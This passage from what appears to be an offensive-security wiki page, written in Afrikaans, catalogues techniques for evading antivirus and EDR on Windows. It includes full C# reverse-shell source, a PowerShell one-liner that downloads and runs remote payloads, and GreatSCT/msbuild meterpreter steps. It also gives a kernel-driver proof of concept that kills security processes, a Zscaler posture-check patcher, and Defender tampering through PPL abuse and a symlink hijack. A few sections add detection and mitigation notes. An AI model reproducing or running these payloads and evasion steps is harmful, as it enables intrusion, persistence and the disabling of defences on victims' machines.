- [**metame**](https://github.com/a0rtega/metame): Metame is 'n eenvoudige metamorphic code engine vir arbitrêre executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator is 'n fynkorrelige code obfuscation framework vir LLVM-ondersteunde tale wat ROP (return-oriented programming) gebruik. ROPfuscator obfuskeer 'n program op die assembly code level deur gewone instruksies in ROP chains te transformeer, en daarmee ons natuurlike konsep van normale control flow ontwrig.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt is 'n .NET PE Crypter geskryf in Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor kan bestaande EXE/DLL omskakel na shellcode en dit dan laai

## SmartScreen & MoTW

Jy het dalk hierdie skerm gesien wanneer jy sekere uitvoerbare lêers vanaf die internet aflaai en dit uitvoer.

Microsoft Defender SmartScreen is 'n sekuriteitsmeganisme wat bedoel is om die eindgebruiker te beskerm teen die uitvoer van moontlik kwaadwillige toepassings.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen werk hoofsaaklik met 'n reputasie-gebaseerde benadering, wat beteken dat ongewone afgelaaide toepassings SmartScreen sal aktiveer en sodoende die eindgebruiker waarsku en verhinder om die lêer uit te voer (alhoewel die lêer steeds uitgevoer kan word deur op More Info -> Run anyway te klik).

**MoTW** (Mark of The Web) is 'n [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) met die naam Zone.Identifier wat outomaties geskep word wanneer lêers vanaf die internet afgelaai word, tesame met die URL waarvan dit afgelaai is.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Kontroleer die Zone.Identifier ADS vir 'n lêer wat vanaf die internet afgelaai is.</p></figcaption></figure>

> [!TIP]
> Dit is belangrik om te let dat uitvoerbare lêers wat met 'n **trusted** signing certificate onderteken is **won't trigger SmartScreen**.

'n Baie effektiewe manier om te verhoed dat jou payloads die Mark of The Web kry, is om hulle in 'n soort houer te verpak, soos 'n ISO. Dit gebeur omdat Mark-of-the-Web (MOTW) **cannot** toegepas word op **non NTFS** volumes.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) is 'n hulpmiddel wat payloads in uitvoerhouers verpak om Mark-of-the-Web te ontduik.

Voorbeeldgebruik:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Hier is 'n demo om SmartScreen te omseil deur payloads binne ISO-lêers te verpak met [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) is 'n kragtige logmeganisme in Windows wat toepassings en stelselkomponente toelaat om **gebeure te registreer**. Dit kan egter ook deur sekuriteitsprodukte gebruik word om kwaadwillige aktiwiteite te monitor en te ontdek.

Soos hoe AMSI gedeaktiveer (omseil) word, is dit ook moontlik om die **`EtwEventWrite`**-funksie van die gebruikersruimte-proses onmiddellik te laat terugkeer sonder om enige gebeurtenisse te registreer. Dit word gedoen deur die funksie in geheue te patseer sodat dit onmiddellik terugkeer, waardeur ETW-registrasie vir daardie proses effektief gedeaktiveer word.

Meer inligting vind jy by **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/)** en **[https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Loading C# binaries in memory is al vir 'n geruime tyd bekend en dit is steeds 'n uitstekende manier om jou post-exploitation-instrumente te laat loop sonder om deur AV gevang te word.

Aangesien die payload direk in geheue gelaai word sonder die skyf aan te raak, hoef ons slegs bekommerd te wees oor die patseer van AMSI vir die hele proses.

Die meeste C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, ens.) bied reeds die vermoë om C# assemblies direk in geheue uit te voer, maar daar is verskeie maniere om dit te doen:

- **Fork\&Run**

Dit behels die skep van 'n nuwe offer-proses, die inject van jou post-exploitation-malisieuse kode in daardie nuwe proses, die uitvoering van jou malisieuse kode en, wanneer voltooi, die beëindiging van die nuwe proses. Dit het beide voordele en nadele. Die voordeel van die fork-and-run-metode is dat uitvoering **buite** ons Beacon-implant proses plaasvind. Dit beteken dat indien iets in ons post-exploitation-aksie verkeerd loop of gevang word, daar 'n **veel groter kans** is dat ons **implant oorleef.** Die nadeel is dat jy 'n **groter kans** het om deur **Behavioural Detections** gevang te word.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Dit gaan oor die inject van die post-exploitation-malisieuse kode **in sy eie proses**. Op hierdie manier kan jy die skepping van 'n nuwe proses en die moontlikheid van AV-skandering vermy, maar die nadeel is dat as iets verkeerd gaan met die uitvoering van jou payload, daar 'n **veel groter kans** is om jou **beacon te verloor** aangesien dit kan crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> As jy meer wil lees oor C# Assembly loading, kyk asseblief na hierdie artikel [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) en hul InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Jy kan ook C# Assemblies **vanuit PowerShell** laai; kyk na [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) en S3cur3th1sSh1t se video (https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Soos voorgestel in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), is dit moontlik om kwaadwillige kode in ander tale uit te voer deur die gekompromitteerde masjien toegang te gee tot die interpreter-omgewing wat op die Attacker Controlled SMB share geïnstalleer is.

Deur toegang tot die Interpreter Binaries en die omgewing op die SMB share toe te laat, kan jy ewekansige kode in hierdie tale in die geheue van die gekompromitteerde masjien uitvoer.

Die repo dui aan: Defender scan nog steeds die skripte, maar deur Go, Java, PHP ens. te gebruik, het ons meer buigbaarheid om statiese handtekeninge te omseil. Toetsing met lukrake onverduisterde reverse shell-skripte in hierdie tale het sukses getoon.

## TokenStomping

Token stomping is 'n tegniek wat 'n aanvaller toelaat om die toegangstoken of 'n sekuriteitsproduk soos 'n EDR of AV te **manipuleer**, wat hulle in staat stel om die bevoegdhede daarvan te verminder sodat die proses nie sterf nie, maar nie die permisies het om na kwaadwillige aktiwiteite te kyk nie.

Om dit te voorkom, kan Windows verhoed dat eksterne prosesse handvatsels oor die tokens van sekuriteitsprosesse kry.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Soos beskryf in [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), is dit maklik om net Chrome Remote Desktop op 'n slagoffer se rekenaar te installeer en dit te gebruik om dit oor te neem en volhoubaarheid te behou:
1. Laai af vanaf https://remotedesktop.google.com/, klik op "Set up via SSH", en klik dan op die MSI-lêer vir Windows om die MSI-lêer af te laai.
2. Voer die installateur stil in die slagoffer uit (admin benodig): `msiexec /i chromeremotedesktophost.msi /qn`
3. Gaan terug na die Chrome Remote Desktop-bladsy en klik volgende. Die wizard sal jou vra om te magtig; klik die Authorize-knoppie om voort te gaan.
4. Voer die gegewe parameter met sommige aanpassings uit: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Let op die pin-parameter wat toelaat om die pin te stel sonder om die GUI te gebruik).

## Advanced Evasion

Evasion is 'n baie ingewikkelde onderwerp; soms moet jy baie verskillende bronne van telemetrie in net een stelsel in ag neem, so dit is amper onmoontlik om heeltemal onopgespoor te bly in volwassen omgewings.

Elke omgewing teen wie jy werk sal sy eie sterk- en swakpunte hê.

Ek beveel sterk aan dat jy hierdie praatjie van [@ATTL4S](https://twitter.com/DaniLJ94) kyk om 'n introductie te kry tot meer gevorderde Evasion-tegnieke.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Dit is ook nog 'n goeie praatjie van [@mariuszbit](https://twitter.com/mariuszbit) oor Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Oud Tegnieke**

### **Kyk watter dele Defender as kwaadwillig vind**

Jy kan [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) gebruik wat dele van die binary sal verwyder totdat dit uitsonder watter deel Defender as kwaadwillig beskou en dit vir jou uiteensit.\
Nog 'n instrument wat dieselfde doen is [**avred**](https://github.com/dobin/avred) met 'n oop webdiens by [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Tot Windows 10 het alle Windows met 'n **Telnet server** gekom wat jy as administrateur kon installeer deur:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Laat dit **begin** wanneer die stelsel opgestart word en **voer** dit nou uit:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Verander telnet port** (stealth) en skakel die firewall af:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Laai dit af vanaf: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (jy wil die bin downloads hê, nie die setup nie)

**OP DIE HOST**: Voer _**winvnc.exe**_ uit en konfigureer die bediener:

- Skakel die opsie _Disable TrayIcon_ aan
- Stel 'n wagwoord in by _VNC Password_
- Stel 'n wagwoord in by _View-Only Password_

Skuif dan die binary _**winvnc.exe**_ en die **nuut geskepte** lêer _**UltraVNC.ini**_ binne die **victim**

#### **Reverse connection**

Die **attacker** moet op sy **host** die binary `vncviewer.exe -listen 5900` uitvoer sodat dit **gereed** is om 'n reverse **VNC connection** te vang. Dan, binne die **victim**: Begin die winvnc daemon `winvnc.exe -run` en voer uit `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** Om stealth te behou mag jy 'n paar dinge nie doen nie

- Moet nie `winvnc` begin as dit reeds loop nie, anders sal jy 'n [popup](https://i.imgur.com/1SROTTl.png) veroorsaak. Kontroleer of dit loop met `tasklist | findstr winvnc`
- Moet nie `winvnc` begin sonder `UltraVNC.ini` in dieselfde gids nie, anders sal dit [the config window](https://i.imgur.com/rfMQWcf.png) oopmaak
- Moet nie `winvnc -h` vir hulp uitvoer nie, anders sal jy 'n [popup](https://i.imgur.com/oc18wcu.png) veroorsaak

### GreatSCT

Laai dit af vanaf: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Binne GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Nou **begin die lister** met `msfconsole -r file.rc` en **voer** die **xml payload** uit met:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Huidige defender sal die proses baie vinnig beëindig.**

### Kompileer ons eie reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Eerste C# Revershell

Kompileer dit met:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Gebruik dit met:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# using compiler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Outomatiese aflaai en uitvoering:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lys van C# obfuscators: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Gebruik python vir build injectors voorbeeld:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Ander gereedskap
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Meer

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – AV/EDR vanaf die kernel-ruimte uitskakel

Storm-2603 het 'n klein konsole-hulpmiddel genaamd **Antivirus Terminator** gebruik om endpoint-beskerming uit te skakel voordat ransomware neergesit is. Die tool bring sy **eie kwesbare maar *signed* driver** en misbruik dit om bevoorregte kernel-operasies uit te voer wat selfs Protected-Process-Light (PPL) AV-dienste nie kan blokkeer nie.

Belangrike punte
1. **Signed driver**: Die lêer wat op skyf afgelewer word is `ServiceMouse.sys`, maar die binêre is die legitiem getekende driver `AToolsKrnl64.sys` van Antiy Labs’ “System In-Depth Analysis Toolkit”. Omdat die driver 'n geldige Microsoft-handtekening dra, laai dit selfs wanneer Driver-Signature-Enforcement (DSE) aangeskakel is.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Die eerste reël registreer die driver as 'n **kernel service** en die tweede begin dit sodat `\\.\ServiceMouse` vanaf user land toeganklik raak.
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminate an arbitrary process by PID (used to kill Defender/EDR services) |
| `0x990000D0` | Delete an arbitrary file on disk |
| `0x990001D0` | Unload the driver and remove the service |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**: BYOVD slaan user-mode beskerming heeltemal oor; kode wat in die kernel uitgevoer word kan *protected* prosesse oopmaak, hulle termineer, of met kernel-objekte knoei ongeag PPL/PP, ELAM of ander verharde funksies.

Opsporing / Mitigering
•  Skakel Microsoft se vulnerable-driver block list in (`HVCI`, `Smart App Control`) sodat Windows weier om `AToolsKrnl64.sys` te laai.
•  Monitor die skepping van nuwe *kernel* dienste en waarsku wanneer 'n driver van 'n wêreld-skryfbare gids gelaai word of nie op die allow-list teenwoordig is nie.
•  Kyk vir user-mode handles na custom device objects gevolg deur verdagte `DeviceIoControl`-aanroepe.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler’s **Client Connector** pas device-posture-reëls plaaslik toe en vertrou op Windows RPC om die resultate aan ander komponente te kommunikeer. Twee swak ontwerpkeuses maak 'n volledige omseiling moontlik:

1. Posture evaluation gebeur **heeltemal client-side** (a boolean word na die server gestuur).
2. Internal RPC endpoints valideer slegs dat die verbindende executable **signed by Zscaler** (via `WinVerifyTrust`).

Deur **vier signed binaries op disk te patch** kan beide meganismes geneutraliseer word:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Gee altyd `1` sodat elke check voldoen |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ enige (selfs unsigned) proses kan aan die RPC pipes bind |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Vervang deur `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Kortgesny |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Na vervanging van die oorspronklike lêers en herbegin van die diensstapel:

* **Alle** houdingkontroles wys **groen/kompliant**.
* Oondertekende of gemodifiseerde binaries kan die named-pipe RPC endpoints oopmaak (bv. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Die gekompromitteerde gasheer kry onbeperkte toegang tot die interne netwerk soos gedefinieer deur die Zscaler-beleide.

Hierdie gevallestudie demonstreer hoe suiwer client-side vertrouensbesluite en eenvoudige handtekeningkontroles met 'n paar byte-patches verslaan kan word.

## Misbruik van Protected Process Light (PPL) om AV/EDR met LOLBINs te manipuleer

Protected Process Light (PPL) afdwing 'n ondertekenaar/vlak hiërargie sodat slegs gelyk-of-hoër beskermde prosesse mekaar kan manipuleer. Aanvallend, as jy 'n wettige PPL-enabled binary kan begin en sy argumente beheer, kan jy onskadelike funksionaliteit (bv. logging) omskep in 'n beperkte, PPL-ondersteunde write primitive teen beskermde directories wat deur AV/EDR gebruik word.

Wat veroorsaak dat 'n proses as PPL uitgevoer word
- Die teiken EXE (en enige gelaaide DLLs) moet onderteken wees met 'n PPL-capable EKU.
- Die proses moet geskep word met CreateProcess met die flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- 'n Kompatibele beskermingsvlak moet aangevra word wat by die ondertekenaar van die binary pas (bv. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` vir anti-malware ondertekenaars, `PROTECTION_LEVEL_WINDOWS` vir Windows-ondertekenaars). Verkeerde vlakke sal by skepping misluk.

Sien ook 'n breër inleiding tot PP/PPL en LSASS-beskerming hier:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher-gereedskap
- Open-source helper: CreateProcessAsPPL (kies beskermingsvlak en stuur argumente deur na die teiken EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Gebruikspatroon:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN-primitief: ClipUp.exe
- Die gesigneerde stelsel binary `C:\Windows\System32\ClipUp.exe` spawn self en aanvaar 'n parameter om 'n loglêer na 'n deur die aanroeper-gespesifiseerde pad te skryf.
- Wanneer as 'n PPL-proses gelanseer, gebeur die lêerskrywing met PPL-ondersteuning.
- ClipUp kan nie paaie met spasies ontleed nie; gebruik 8.3 kortpaaie om na normaalweg beskermde plekke te wys.

8.3 kortpad-hulp
- Lys kortname: `dir /x` in elke ouergids.
- Bepaal kortpad in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Misbruik-ketting (opsomming)
1) Lanseer die PPL-geskikte LOLBIN (ClipUp) met `CREATE_PROTECTED_PROCESS` deur 'n launcher te gebruik (bv., CreateProcessAsPPL).
2) Gee die ClipUp log-pad argument om 'n lêerskepping in 'n beskermde AV-gids af te dwing (bv., Defender Platform). Gebruik 8.3 kortname indien nodig.
3) As die teiken binary normaalweg deur die AV oop/gesluit is terwyl dit loop (bv., MsMpEng.exe), skeduleer die skrywing by opstart voordat die AV begin deur 'n auto-start diens te installeer wat betroubaar vroeër loop. Valideer opstart-volgorde met Process Monitor (boot logging).
4) By herbegin gebeur die PPL-ondersteunde skrywing voordat die AV sy binaries sluit, wat die teikenlêer korrup maak en opstart verhoed.

Voorbeeld-oproep (paaie weggelaat/verkort vir veiligheid):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Aantekeninge en beperkings
- Jy kan nie die inhoud wat ClipUp skryf buite die plasing beheer nie; die primitief is geskik vir korrupsie eerder as vir presiese inhoudsinspuiting.
- Vereis plaaslike admin/SYSTEM om 'n diens te installeer/te begin en 'n herbegin-venster.
- Tyding is krities: die teiken mag nie oop wees nie; uitvoering tydens opstart vermy lêerslotte.

Opsporings
- Proses-skepping van `ClipUp.exe` met ongewone argumente, veral geparent deur nie-standaard opstarters, rondom opstart.
- Nuwe dienste gekonfigureer om outo-start binaries te begin en wat konsekwent voor Defender/AV begin. Ondersoek diensskepping/wysiging voorafgaand aan Defender opstart-foute.
- Lêerintegriteitsmonitering op Defender binaries/Platform-lêergidse; onverwagte lêerskeppings/wysigings deur prosesse met protected-process vlagte.
- ETW/EDR-telemetrie: kyk vir prosesse geskep met `CREATE_PROTECTED_PROCESS` en abnormale PPL-vlak gebruik deur nie-AV binaries.

Mitigeringsmaatreëls
- WDAC/Code Integrity: beperk watter gesigneerde binaries as PPL mag loop en onder watter ouers; blokkeer ClipUp-aanroep buite geldige kontekste.
- Dienshigiëne: beperk skepping/wysiging van outo-start dienste en monitor manipulasie van opstartvolgorde.
- Maak seker Defender tamper protection en early-launch protections is geaktiveer; ondersoek opstartfoute wat na binary-korrupsie wys.
- Oorweeg om 8.3 kort-naam generasie te deaktiveer op volumes wat security tooling huisves indien versoenbaar met jou omgewing (toets deeglik).

Verwysings vir PPL en gereedskap
- Microsoft Protected Processes oorsig: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU verwysing: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Tegniek-beskrywing (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender kies die platform waarvandaan dit loop deur subgidse te enumereren onder:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Dit kies die subgids met die hoogste leksikografiese weergawestreng (bv. `4.18.25070.5-0`), en begin dan die Defender diensprosesse van daar (en werk diens/registrie-paadjies ooreenkomstig op). Hierdie seleksie vertrou gidsinskrywings insluitend directory reparse points (symlinks). 'n Administrator kan dit benut om Defender na 'n deur 'n aanvaller skryfbare pad te herlei en DLL sideloading of diensontwrigting te bewerkstellig.

Voorvereistes
- Local Administrator (nodig om gidse/symlinks te skep onder die Platform-gids)
- Vermoë om te herbegin of Defender platform her-seleksie te trigger (diens herbegin op opstart)
- Slegs ingeboude gereedskap nodig (mklink)

Waarom dit werk
- Defender blokkeer skryfaksies in sy eie gidse, maar sy platformselektering vertrou gidsinskrywings en kies die leksikografies hoogste weergawe sonder om te valideer dat die teiken na 'n beskermde/betroubare pad oplos.

Stap-vir-stap (voorbeeld)
1) Berei 'n skryfbare kloon voor van die huidige platform-gids, bv. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Skep 'n hoër-weergawe gids-symlink binne Platform wat na jou gids wys:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Trigger-keuse (herbegin aanbeveel):
```cmd
shutdown /r /t 0
```
